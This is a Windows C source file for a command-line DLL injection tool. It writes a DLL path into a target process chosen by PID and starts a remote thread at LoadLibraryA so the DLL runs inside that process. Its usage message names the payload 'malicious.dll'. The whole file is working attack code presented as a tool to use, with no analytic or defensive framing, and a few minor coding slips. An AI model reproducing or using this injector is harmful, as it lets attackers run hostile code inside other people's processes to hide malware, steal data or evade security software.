#include <windows.h>
#include <stdio.h>

DispError(){
	LPVOID lpMsgBuf;
	FormatMessage(
			FORMAT_MESSAGE_ALLOCATE_BUFFER |
			FORMAT_MESSAGE_FROM_SYSTEM |
			FORMAT_MESSAGE_IGNORE_INSERTS,
			NULL, GetLastError(),
			MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
			(LPTSTR) &lpMsgBuf, 0, NULL);
	printf("Error: %s\n", (const char*)lpMsgBuf);
	LocalFree(lpMsgBuf);
}


static void inject(DWORD pid,char *fname){
	HANDLE hp = NULL;
	HANDLE ht = NULL;
	PWSTR remote_ptr = NULL;
	PTHREAD_START_ROUTINE remote_start;

	__try{
		SetLastError(NO_ERROR);

		// 1. OpenProcess
		hp = OpenProcess(
			PROCESS_CREATE_THREAD|   // CreateRemoteThread
			PROCESS_VM_OPERATION|    // VirtualAllocEx
			PROCESS_VM_WRITE,        // WriteProcessMemory
			FALSE,pid);
		if (hp == NULL){
			printf("Could not OpenProcess\n");
			__leave;
		}

		// 2. VirtualAllocEx :
		remote_ptr = (PWSTR)VirtualAllocEx(hp, NULL, strlen(fname) + 1, MEM_COMMIT,PAGE_READWRITE);
		if (remote_ptr == NULL){
			printf("VirtualAllocEx Error\n");
			__leave;
		}
		// 3. WriteProcessMemory
		if (!WriteProcessMemory(hp, remote_ptr, fname,strlen(fname) + 1, NULL)){
			printf("WriteProcessMemory Error\n");
			__leave;
		}

		// 4. GetProcessAddress
		remote_start = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA("Kernel32"), "LoadLibraryA");
		if (remote_start == NULL){
			printf("GetProcess Address Error\n");
			__leave;
		}

		// 5. CreateRemoteThread
		ht = CreateRemoteThread(hp, NULL, 0, remote_start, remote_ptr, 0, NULL);
		if (ht == NULL){
			DispError();
			printf("CreateRemoteThread Error\n");
			__leave;
		}

    // 6. WaitForSingleObject
		WaitForSingleObject(ht, INFINITE);
		printf("Remote Thread initialization completed\n");
	}
	__finally{
		if (remote_ptr != NULL) VirtualFreeEx(hp, remote_ptr, 0, MEM_RELEASE);
		if (ht != NULL) CloseHandle(ht);
		if (hp != NULL) {} CloseHandle(hp);
	}
}

int main(int argc,char **argv){
	int id;
	if (argc != 3){
		printf("Usage: dllinjection.exe [PID] malicious.dll \n");
		return 0;
	}
	if ((id = atoi(argv[1])) == 0){
		id = GetCurrentProcessId();
		printf("Self Injection PID = %d\n", id);
	} else {
		printf("Cross Injection PID = %d\n", id);
	}
	// DLL Injection
	inject(id, argv[2]);
	return 0;
}
